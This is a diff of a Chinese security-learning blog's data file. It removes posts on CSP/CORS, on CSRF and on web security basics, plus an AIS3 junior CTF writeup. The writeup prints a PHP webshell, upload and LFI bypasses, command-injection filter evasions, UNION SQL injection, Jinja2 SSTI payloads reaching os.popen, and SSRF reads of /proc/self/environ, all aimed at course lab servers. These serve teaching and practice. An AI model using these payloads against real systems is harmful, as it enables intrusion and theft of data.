+      <categories>
+        <category>2024 AIS3 junior</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AIS3 junior DAY1-網路概論</title>
     <url>/2024/08/18/AIS3-junior-DAY1-%E7%B6%B2%E8%B7%AF%E6%A6%82%E8%AB%96/</url>
     <content><![CDATA[<h2 id="甚麼是資訊安全"><a href="#甚麼是資訊安全" class="headerlink" title="甚麼是資訊安全"></a>甚麼是資訊安全</h2><ul>
@@ -431,523 +777,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CSP（內容安全策略）、SOP（同源策略）和CORS（跨源資源共享）</title>
-    <url>/2024/08/04/CSP%EF%BC%88%E5%85%A7%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%89%E3%80%81SOP%EF%BC%88%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%89%E5%92%8CCORS%EF%BC%88%E8%B7%A8%E6%BA%90%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89/</url>
-    <content><![CDATA[<h4 id="1-CSP（內容安全策略）"><a href="#1-CSP（內容安全策略）" class="headerlink" title="1. CSP（內容安全策略）"></a>1. CSP（內容安全策略）</h4><ul>
-<li>定義：CSP允許應用程序定義允許加載的內容來源，例如JavaScript、HTML框架和小程序。</li>
-<li>作用：防止跨站腳本攻擊、點擊劫持和其他內容注入。</li>
-<li>指令示例：<ul>
-<li>script-src：定義可以執行的腳本。</li>
-<li>form-action：列出表單提交的有效端點。</li>
-<li>child-src：定義嵌入框架允許的內容。</li>
-<li>object-src：限制Flash和其他插件的加載來源。</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-SOP（同源策略）"><a href="#2-SOP（同源策略）" class="headerlink" title="2. SOP（同源策略）"></a>2. SOP（同源策略）</h4><ul>
-<li>定義：SOP是一個安全機制，用於隔離不同來源的資源。</li>
-<li>工作原則：腳本在一個網站上執行時不能訪問另一個網站上的某些資源，例如Cookie。</li>
-<li>同源定義：協議、主機、端口的組合。</li>
-</ul>
-<h4 id="3-CORS（跨源資源共享）"><a href="#3-CORS（跨源資源共享）" class="headerlink" title="3. CORS（跨源資源共享）"></a>3. CORS（跨源資源共享）</h4><ul>
-<li>定義：CORS是一個允許通過特定的HTTP頭來覆蓋SOP的機制，使得資源（如API）可以跨域訪問。</li>
-<li>請求頭：客戶端在調用服務器時自動設置。</li>
-<li>響應頭示例：<ul>
-<li>Access-Control-Allow-Origin：指定可以訪問資源的URL。</li>
-<li>Access-Control-Allow-Methods：指定訪問資源時允許的方法。</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-安全漏洞的原因"><a href="#4-安全漏洞的原因" class="headerlink" title="4. 安全漏洞的原因"></a>4. 安全漏洞的原因</h4><ul>
-<li>CORS配置不當：例如，使用通配符*設置Access-Control-Allow-Origin，允許所有外部來源。</li>
-<li>CSP配置不當：例如，未正確設置child-src，允許加載惡意iframe。</li>
-</ul>
-<h4 id="5-安全漏洞的影響"><a href="#5-安全漏洞的影響" class="headerlink" title="5. 安全漏洞的影響"></a>5. 安全漏洞的影響</h4><ul>
-<li>私有API或應用程序資源可能暴露給所有外部來源，導致信息洩露或收入損失。</li>
-<li>內容注入可能導致跨站腳本攻擊或其他惡意內容注入。</li>
-</ul>
-<h4 id="6-預防措施"><a href="#6-預防措施" class="headerlink" title="6. 預防措施"></a>6. 預防措施</h4><ul>
-<li>CSP：<ul>
-<li>確定哪些資源應該能夠運行。</li>
-<li>為每個頁面明確指定資源。</li>
-<li>設置default-src。</li>
-<li>避免配置過於寬泛，不要使用通配符允許公共訪問。</li>
-</ul>
-</li>
-<li>CORS：<ul>
-<li>正確配置CORS頭，避免使用通配符，確保只有授權的來源可以訪問資源。</li>
-</ul>
-</li>
-</ul>
-<h4 id="7-結論"><a href="#7-結論" class="headerlink" title="7. 結論"></a>7. 結論</h4><ul>
-<li>通過正確配置CSP和CORS，可以顯著提高應用程序的安全性，防止多種網絡攻擊。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>安全達人養成計劃研習</category>
-      </categories>
-      <tags>
-        <tag>網路漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CSRF 攻擊</title>
-    <url>/2024/08/04/CSRF-%E6%94%BB%E6%93%8A/</url>
-    <content><![CDATA[<h1 id="跨站點請求偽造-CSRF-攻擊"><a href="#跨站點請求偽造-CSRF-攻擊" class="headerlink" title="跨站點請求偽造(CSRF 攻擊)"></a>跨站點請求偽造(CSRF 攻擊)</h1><ol>
-<li>CSRF 攻擊定義：<ul>
-<li>跨站請求偽造（CSRF）發生在第三方能夠欺騙用戶的網絡瀏覽器執行用戶當前已經驗證的網站上的操作。</li>
-</ul>
-</li>
-<li>CSRF 攻擊原因：<ul>
-<li>當具有可預測輸入欄位的網絡應用程序未檢查來自用戶瀏覽器的操作是否實際上是由用戶意圖的時候，就會發生 CSRF。</li>
-</ul>
-</li>
-<li>CSRF 攻擊後果：<ul>
-<li>成功的 CSRF 攻擊影響取決於應用程序的功能以及驗證受害者被允許執行的操作：更改密碼、購買商品、轉移資金、發布消息等。</li>
-</ul>
-</li>
-<li>CSRF 攻擊示例：<ul>
-<li>受害者登錄銀行網站，瀏覽器中設置了 bank.com 的 cookie。當受害者在未登出狀態下瀏覽攻擊者控制的網站時，該網站包含惡意腳本，利用受害者的當前會話執行惡意請求，銀行將錢轉移到攻擊者的帳戶中。</li>
-</ul>
-</li>
-<li>CSRF 攻擊預防措施：<ul>
-<li>應保護狀態改變操作，使用 CSRF 令牌。該令牌是一個安全、隨機的值，與用戶和會話相關聯。應作為隱藏字段添加到表單中，並在提交時由服務器檢查。或者，可以在敏感操作中實現重新驗證。</li>
-</ul>
-</li>
-<li>CSRF 攻擊預防錯誤：<ul>
-<li>驗證請求是否由用戶意圖執行。</li>
-<li>為每個請求附加 CSRF 令牌。令牌應該是長、獨特、隨機的，每個用戶和每個會話都不同。</li>
-<li>另外，對敏感操作實施挑戰-響應機制，如 CAPTCHA、一次性密碼或重新驗證。</li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>安全達人養成計劃研習</category>
-      </categories>
-      <tags>
-        <tag>網路漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AIS3 junior DAY2 網頁安全 writeup</title>
-    <url>/2024/10/07/AIS3%20junior%20DAY2%20%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%20writeup/</url>
-    <content><![CDATA[<h1 id="AIS3-junior-DAY2-上午-網頁安全"><a href="#AIS3-junior-DAY2-上午-網頁安全" class="headerlink" title="AIS3 junior DAY2 上午 網頁安全"></a>AIS3 junior DAY2 上午 網頁安全</h1><p>[TOC]</p>
-<h2 id="01-Broken-Access-Control"><a href="#01-Broken-Access-Control" class="headerlink" title="01 - Broken Access Control"></a>01 - Broken Access Control</h2><h3 id="BAC01"><a href="#BAC01" class="headerlink" title="BAC01"></a>BAC01</h3><p>隨便打一個名子login<br>查看url <a href="http://ctfd-ais3.crazyfirelee.tw:9001/user">http://ctfd-ais3.crazyfirelee.tw:9001/user</a><br>將<code>user</code>改成<code>admin</code><br><img src="https://hackmd.io/_uploads/B1X-5r3cA.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{FirstBROKENAccessControl;}</p>
-</blockquote>
-<h3 id="BAC02"><a href="#BAC02" class="headerlink" title="BAC02"></a>BAC02</h3><p>到<code>Product List</code>裡面觀察每個 <code>View Details</code>的 url 發現後面都有編號且唯獨少了4<br>將4打上去url試試看 <a href="http://ctfd-ais3.crazyfirelee.tw:9002/product/4">http://ctfd-ais3.crazyfirelee.tw:9002/product/4</a><br><img src="https://hackmd.io/_uploads/HkwJiB39R.png" alt="image"><br>點<code>buy</code>進去拿到flag<br><img src="https://hackmd.io/_uploads/Hk-fsS29R.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{BroJustFoundBabyIDORVulnerability}</p>
-</blockquote>
-<h3 id="BAC03"><a href="#BAC03" class="headerlink" title="BAC03"></a>BAC03</h3><p>先用第一題的方法試試看 將url後面改成<code>admin</code><br><img src="https://hackmd.io/_uploads/BJaS9L25C.png" alt="image"><br>沒有辦法得到flag<br>換另一種方法 用linux的<code>curl</code>試試看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://ctfd-ais3.crazyfirelee.tw:9003/admin</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/SyWzoU35R.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{BabyBRokenAccEssControoooooool}</p>
-</blockquote>
-<h2 id="02-File-Upload"><a href="#02-File-Upload" class="headerlink" title="02 - File Upload"></a>02 - File Upload</h2><h3 id="FIL01"><a href="#FIL01" class="headerlink" title="FIL01"></a>FIL01</h3><p>先寫一個webshell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>檔名用<code>.php</code>結尾<br>將webshell上傳<br><img src="https://hackmd.io/_uploads/rk0KOShqA.png" alt="image"></p>
-<p>將url改成 <a href="http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9011/uploads/a764c_108.160.138.201.php</a><br>利用剛才上傳的webshell<br>將命令打在url後面<code>?cmd=ls ../</code><br>結果如下圖<em>找到了FLAG</em><br><img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image"></p>
-<p>將命令改成<code>?cmd=cat ../FLAG</code><br><img src="https://hackmd.io/_uploads/r13xKrn90.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{FirstWEBSHELLXDDD}</p>
-</blockquote>
-<h3 id="FIL02"><a href="#FIL02" class="headerlink" title="FIL02"></a>FIL02</h3><p>先寫一個webshell</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>將檔名改成 <code>(隨你喜歡).jpg.php </code><br>上傳時用brup將他攔下來<br><img src="https://hackmd.io/_uploads/Bkj2HBn5C.png" alt="image"><br>將<code>Contect -Type </code>後面改成 <code>image/jpg</code><br><code>forward</code>的結果如圖<br><img src="https://hackmd.io/_uploads/B1IyESn50.png" alt="image"></p>
-<p>將url改成 <a href="http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9012/uploads/2a54e_108.160.138.201.php</a><br>利用剛才上傳的webshell<br>將命令打在url後面<code>?cmd=ls ../</code><br>結果如下圖<em>找到了FLAG</em><br><img src="https://hackmd.io/_uploads/rye_PS3q0.png" alt="image"></p>
-<p>將命令改成<code>?cmd=cat ../FLAG</code><br><img src="https://hackmd.io/_uploads/ryF6DH25A.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{BabyUploadBypass}</p>
-</blockquote>
-<h2 id="03-Local-File-Inclusion"><a href="#03-Local-File-Inclusion" class="headerlink" title="03 - Local File Inclusion"></a>03 - Local File Inclusion</h2><h3 id="LFI01"><a href="#LFI01" class="headerlink" title="LFI01"></a>LFI01</h3><p>照片很可疑<br>將照片url複製 <a href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=static/bitcoinCat.jpg">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg</a></p>
-<p>利用上課所教的<code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p>先把<code>static/bitcoinCat.jpg</code>給刪掉</p>
-<p>把<code>php://filter/read=convert.base64-encode/resource=index.php</code>加進去url中<br>改成 <a href="http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&file=php://filter/read=convert.base64-encode/resource=index.php">http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php</a></p>
-<p>獲得一段base64加密過的東西<img src="https://hackmd.io/_uploads/Bk9U6rn5A.png" alt="image"></p>
-<p>全選複製後去先上平台解密<br><img src="https://hackmd.io/_uploads/Hkv9aBnqC.png" alt="image"></p>
-<p>得到帳號:<code>admin</code> 密碼:<code>CATLOVEBITCOINMEOWMEOW</code><br>得到flag</p>
-<p><img src="https://hackmd.io/_uploads/HyWAaH2c0.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{php:&#x2F;&#x2F;filter&#x2F;BabyPHPLFI.b64decode()}</p>
-</blockquote>
-<h3 id="LFI02"><a href="#LFI02" class="headerlink" title="LFI02"></a>LFI02</h3><p>像FIL01和FIL02一樣 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>將webshell檔案上傳<br><img src="https://hackmd.io/_uploads/H1XlhI3qA.png" alt="image"></p>
-<p>發現檔案在<code>tmp</code>底下 而tmp又在根目錄底下<br>所以我們要利用..&#x2F;..&#x2F;..&#x2F;..&#x2F; 跳到根目錄<br>在將 <code>/tmp/a764c_108.160.138.201.php</code>貼到根目錄後面<br>像是這樣 <a href="http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php">http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=../../../../../tmp/a764c_108.160.138.201.php</a></p>
-<p>接著再用<code>&amp;cmd=ls</code> 獲得我們想要的檔案 <code>S3Cr3TFLAGGGGG</code></p>
-<p><img src="https://hackmd.io/_uploads/BkBv1Dh9C.png" alt="image"></p>
-<p>最後用<code>cat S3Cr3TFLAGGGGG</code> 將flag印出</p>
-<p><img src="https://hackmd.io/_uploads/S17ngDnqR.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;BADBAD.php?LFI&#x3D;SUCCESS}</p>
-</blockquote>
-<h2 id="05-Command-Injection"><a href="#05-Command-Injection" class="headerlink" title="05 - Command Injection"></a>05 - Command Injection</h2><h3 id="CMD01"><a href="#CMD01" class="headerlink" title="CMD01"></a>CMD01</h3><p>先用<code>;ls</code> 查看有什麼東西</p>
-<p><img src="https://hackmd.io/_uploads/Skk8Ew3qC.png" alt="image"></p>
-<p>發現有很多像flag的東西<br>先用cat印出<code>REAL_FLAG</code><br><em>發現是騙人的</em></p>
-<p>再去試試看<code>FLAG</code> 就出來了</p>
-<p><img src="https://hackmd.io/_uploads/Hyas4D3cC.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{BabyCommand;InjectionXDDDddddd}</p>
-</blockquote>
-<h3 id="CMD02"><a href="#CMD02" class="headerlink" title="CMD02"></a>CMD02</h3><p>想和上一題一樣 用<code>;ls</code> 結果沒有辦法<br>上網發現<code>;echo *</code> 也有一樣的效果<br><img src="https://hackmd.io/_uploads/H1s_CwhcC.png" alt="image"><br>找到FLAG<br>用<code>;c\at F*</code>繞過黑名單 當作<code>cat FLAG</code> 得到flag</p>
-<blockquote>
-<p>AIS3_Junior{niceWordBL$()ACKListEvasion;}</p>
-</blockquote>
-<h3 id="CMD03"><a href="#CMD03" class="headerlink" title="CMD03"></a>CMD03</h3><ul>
-<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單 </li>
-<li>用base64加密列出<code>ls</code>的東西<br><del>發現跟[Bonus] CMD06一樣</del><br><del>就用跟[Bonus] CMD06一樣的解法</del></li>
-<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br><img src="https://hackmd.io/_uploads/H1IZqkp5A.png" alt="image"><br><code>AIS3_Junior&#123;BashOperato|rEvasion$&#123;IFS&#125;SUCC|ESSFUL|:DDDDD&#125;</code></li>
-</ul>
-<h3 id="Bonus-CMD06"><a href="#Bonus-CMD06" class="headerlink" title="[Bonus] CMD06"></a>[Bonus] CMD06</h3><ul>
-<li>用<code>$(l$&#123;x&#125;s|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code> 繞過黑名單 </li>
-<li>用base64加密列出<code>ls</code>的東西<br><img src="https://hackmd.io/_uploads/HyGrPJTcA.png" alt="image"></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RkxBRwptYWluLnB5CnByZXN0YXJ0LnNoCnJlcXVpcmVtZW50cy50eHQKc3RhdGljCnRlbXBsYXRlcwp1d3NnaS5pbmkK</span><br></pre></td></tr></table></figure>
-<ul>
-<li>把上述用線上解密</li>
-</ul>
-<p><img src="https://hackmd.io/_uploads/S1itwJa9A.png" alt="image"></p>
-<ul>
-<li>發現FLAG</li>
-<li>用<code>$(ca$&#123;x&#125;t$&#123;IFS&#125;FLAG|base64$&#123;IFS&#125;-w$&#123;IFS&#125;0)</code>將flag以base64印出<br><img src="https://hackmd.io/_uploads/HkbxuJpq0.png" alt="image"><br>*<code>QUlTM19KdW5pb3J7b3VvX2hpaGl9Cg==</code>用base64線上解密<br><img src="https://hackmd.io/_uploads/BkAmuk6q0.png" alt="image"></li>
-</ul>
-<h2 id="06-SQL-Injection"><a href="#06-SQL-Injection" class="headerlink" title="06 - SQL Injection"></a>06 - SQL Injection</h2><h3 id="SQL1"><a href="#SQL1" class="headerlink" title="SQL1"></a>SQL1</h3><p>用最簡單的SQL語法就可以拿到flag<br><del>好像簡單的CTF第一題SQL都可以用<code>admin&#39;--</code></del><br>帳號<code>admin&#39;--</code> 密碼隨便填<br><img src="https://hackmd.io/_uploads/B1FZku3cR.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{SQL’InjectionXDorD&#x3D;D_–_-}</p>
-</blockquote>
-<h3 id="SQL2"><a href="#SQL2" class="headerlink" title="SQL2"></a>SQL2</h3><p>參考網站: <a href="https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/">https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/</a><br>先用<code>pp&#39;UNION SELECT NULL#</code>去嘗試讓兩個表中有相同的columns<br><img src="https://hackmd.io/_uploads/BJZSV-a9A.png" alt="image"></p>
-<ul>
-<li>直到<code>pp&#39; UNION SELECT NULL, NULL,NULL,NULL#</code></li>
-</ul>
-<p><img src="https://hackmd.io/_uploads/BkJj4Zp9A.png" alt="image"></p>
-<p>*列出所有table</p>
-<ol>
-<li>mysql</li>
-<li>information_schema</li>
-<li>performance_schema</li>
-<li>sys</li>
-<li>arsenal</li>
-<li>ApexPredators<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(schema_name),group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure>
-<img src="https://hackmd.io/_uploads/HJzhUW69A.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1fMGYa5C.png" alt="image"></li>
-</ol>
-<ul>
-<li>發現網頁左上角剛好是第六個table的名稱 猜測可能是要到<code>ApexPredators</code></li>
-<li>試試看將我們所要的table:<code>ApexPredators</code>抓出來</li>
-<li>接著繼續往下找ApexPredators的東西<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(table_name),group_concat(table_name),group_concat(table_name),group_concat(table_name) from information_schema.tables where table_schema=&#x27;ApexPredators&#x27; #</span><br></pre></td></tr></table></figure>
-<img src="https://hackmd.io/_uploads/BkoQ_-p5C.png" alt="image"></li>
-<li>發現有users</li>
-<li>繼續往下找users的東西<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(column_name),group_concat(column_name),group_concat(column_name),group_concat(column_name) from information_schema.columns where table_schema=&#x27;ApexPredators&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
-<img src="https://hackmd.io/_uploads/r1MidbaqC.png" alt="image"></li>
-<li>發現users底下有 id,isAdmin,password,username</li>
-<li>印出id,isAdmin,password,username裡面的內容<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pp&#x27; UNION SELECT id,username,password,isAdmin from ApexPredators.users#</span><br></pre></td></tr></table></figure>
-<img src="https://hackmd.io/_uploads/rkuIFZpc0.png" alt="image"></li>
-<li>發現只有<code>KubenBlisk</code>下面的值是1 <del>大膽假設是admin</del><br>帳號:KubenBlisk 密碼:BliskLeader#2024<br>登入後就得到flag<br><img src="https://hackmd.io/_uploads/rJFf5ba9A.png" alt="image"></li>
-</ul>
-<h2 id="07-Server-Side-Template-Injection"><a href="#07-Server-Side-Template-Injection" class="headerlink" title="07 - Server-Side Template Injection"></a>07 - Server-Side Template Injection</h2><h3 id="STI01"><a href="#STI01" class="headerlink" title="STI01"></a>STI01</h3><p>參考資料:</p>
-<ul>
-<li><a href="https://blog.1997sty.com/archives/5570">https://blog.1997sty.com/archives/5570</a></li>
-<li><a href="https://ithelp.ithome.com.tw/articles/10244403">https://ithelp.ithome.com.tw/articles/10244403</a></li>
-</ul>
-<p><img src="https://hackmd.io/_uploads/S1h1AZ6qA.png" alt="image"><br>裡面有:<code>.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</code></p>
-<ul>
-<li><p>__class__抓到底下的str</p>
-</li>
-<li><p>__base__抓到str上層的object</p>
-</li>
-<li><p><strong>subclasses</strong>() Object底下所有的東西，包含函式等[138]應該是popen object</p>
-</li>
-<li><p><strong>init</strong> 初始化 object</p>
-</li>
-<li><p><strong>globals</strong>[‘popen’] 初始化object下的popen<br>(‘cat FLAG’).read() popen執行cat FLAG並讀出來</p>
-</li>
-<li><p>將payload改為:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat FLAG&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>即可拿到flag<br><img src="https://hackmd.io/_uploads/r1PdRZacR.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{.<strong>JinjaTWOOOO.</strong>_[“SSTI”]<strong>.succ3ssXDD.</strong>}</p>
-</blockquote>
-</li>
-</ul>
-<h3 id="STI02"><a href="#STI02" class="headerlink" title="STI02"></a>STI02</h3><p>參考資料: </p>
-<ul>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars</a></li>
-<li><a href="https://ithelp.ithome.com.tw/articles/10244403">https://ithelp.ithome.com.tw/articles/10244403</a></li>
-</ul>
-<p><img src="https://hackmd.io/_uploads/HJBl8z6q0.png" alt="image"></p>
-<p>從全域物件中獲取任何函數，可存取<code>__globals__.__builtins__</code>，實現RCE</p>
-<p>payload:<code>&#123;&#123;request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()&#125;&#125;</code></p>
-<p><img src="https://hackmd.io/_uploads/SkjO8zTqC.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</p>
-</blockquote>
-<h2 id="08-Server-Side-Request-Forgery"><a href="#08-Server-Side-Request-Forgery" class="headerlink" title="08 - Server-Side Request Forgery"></a>08 - Server-Side Request Forgery</h2><h3 id="SRF01"><a href="#SRF01" class="headerlink" title="SRF01"></a>SRF01</h3><ul>
-<li>題目有提示 <code>Flag Location : /app/FLAG</code></li>
-<li>發現可以用<code>file:// 表示這是一個本地文件的路徑</code>來去看題目給的路徑</li>
-<li>於是我們直接在網站payload -&gt;<code>file:///app/FLAG</code></li>
-</ul>
-<p><img src="https://hackmd.io/_uploads/Sy_n9dh90.png" alt="image"></p>
-<p>點擊右邊的圖片的原始碼<br><img src="https://hackmd.io/_uploads/B1Slsu3qC.png" alt="image"><br>可以發現有一個被base64加密的東西<br><code>QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==</code><br>線上解密之後拿到flag<br><img src="https://hackmd.io/_uploads/ryqLju2qC.png" alt="image"></p>
-<blockquote>
-<p>AIS3_Junior{file:&#x2F;&#x2F;SSRF___XDDD}</p>
-</blockquote>
-<h3 id="SRF02"><a href="#SRF02" class="headerlink" title="SRF02"></a>SRF02</h3><p>參考資料 <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><img src="https://hackmd.io/_uploads/By27jWaqA.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/environ #可查看當下進程的環境變量</span><br></pre></td></tr></table></figure>
-<ul>
-<li>跟上題一樣用<code>file://</code></li>
-<li>payload&#x3D;<code>file:///proc/self/environ</code></li>
-</ul>
-<p><img src="https://hackmd.io/_uploads/Byg3s-65C.png" alt="image"></p>
-<ul>
-<li>查看圖片原始檔<br><img src="https://hackmd.io/_uploads/Sk_khba5R.png" alt="image"></li>
-</ul>
-<p>發現有base64加密的內容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SE9TVE5BTUU9MTIzMWRlMGVjMjZlAFBZVEhPTl9QSVBfVkVSU0lPTj0yMy4wLjEASE9NRT0vcm9vdABQWVRIT05VTkJVRkZFUkVEPTEAR1BHX0tFWT1BMDM1QzhDMTkyMTlCQTgyMUVDRUE4NkI2NEU2MjhGOEQ2ODQ2OTZEAFVXU0dJX0lOST0vYXBwL3V3c2dpLmluaQBOR0lOWF9NQVhfVVBMT0FEPTAAVVdTR0lfUFJPQ0VTU0VTPTE2AFBZVEhPTkRPTlRXUklURUJZVEVDT0RFPTEAU1RBVElDX1VSTD0vc3RhdGljAFBZVEhPTl9HRVRfUElQX1VSTD1odHRwczovL2dpdGh1Yi5jb20vcHlwYS9nZXQtcGlwL3Jhdy82NmQ4YTBmNjM3MDgzZTJjM2RkZmZjMGNiMWU2NWNlMTI2YWZiODU2L3B1YmxpYy9nZXQtcGlwLnB5AFVXU0dJX0NIRUFQRVI9MgBQQVRIPS91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbgBMQU5HPUMuVVRGLTgAUFlUSE9OX1ZFUlNJT049My4xMC4xNABQWVRIT05fU0VUVVBUT09MU19WRVJTSU9OPTY1LjUuMQBOR0lOWF9XT1JLRVJfUFJPQ0VTU0VTPTEATElTVEVOX1BPUlQ9ODAAU1RBVElDX0lOREVYPTAAUFdEPS9hcHAAUFlUSE9OX0dFVF9QSVBfU0hBMjU2PTZmYjdiNzgxMjA2MzU2ZjQ1YWQ3OWVmYmIxOTMyMmNhYTZjMmE1YWQzOTA5MmQwZDQ0ZDBmZWM5NDExN2UxMTgAU1RBVElDX1BBVEg9L2FwcC9zdGF0aWMAUFlUSE9OUEFUSD0vYXBwAEZMQUc9QUlTM19KdW5pb3J7aHR0cDovL0JST0FjY2Vzc0xPQ0FMfQA=</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>放到線上平台解密</li>
-<li>得到flag<br><img src="https://hackmd.io/_uploads/ByRI2-pcA.png" alt="image"><blockquote>
-<p>AIS3_Junior{<a href="http://broaccesslocal}/">http://BROAccessLOCAL}</a></p>
-</blockquote>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>2024 AIS3 junior</category>
-      </categories>
-      <tags>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AIS3 junior DAY2-網頁安全</title>
-    <url>/2024/08/18/AIS3-junior-DAY2-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8/</url>
-    <content><![CDATA[<h2 id="Basic-Web-Security"><a href="#Basic-Web-Security" class="headerlink" title="Basic Web Security"></a>Basic Web Security</h2><h3 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h3><ul>
-<li>網頁的表達方式<ul>
-<li>router based<ul>
-<li>透過程式控制頁面切換，不重新加載整個網站</li>
-</ul>
-</li>
-<li>file based<ul>
-<li>每個網頁文件對應一個 URL</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Broken-Access-Control"><a href="#Broken-Access-Control" class="headerlink" title="Broken Access Control"></a>Broken Access Control</h3><p>網頁未成功執行身份驗證機制就是 Broken Access Control（訪問控制破壞）</p>
-<ul>
-<li>影響：影響完整性、RCE</li>
-</ul>
-<h3 id="RCE-Remote-Code-Command-Execution"><a href="#RCE-Remote-Code-Command-Execution" class="headerlink" title="RCE(Remote Code&#x2F;Command Execution)"></a>RCE(Remote Code&#x2F;Command Execution)</h3><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>透過網頁執行系統命令達成RCE</p>
-<ul>
-<li>體積小、隱蔽性高</li>
-<li>功能強大、易植入</li>
-<li>透過上傳檔案來部屬</li>
-<li>常見的繞過方式<ul>
-<li>使用未禁止的副檔名<ul>
-<li>PHP: pht, pthm, phtml, php5, php6…</li>
-<li>ASP: config, inc, ashx, axd, rem…</li>
-<li>JSP: jsw, wss, do, action, jspf…</li>
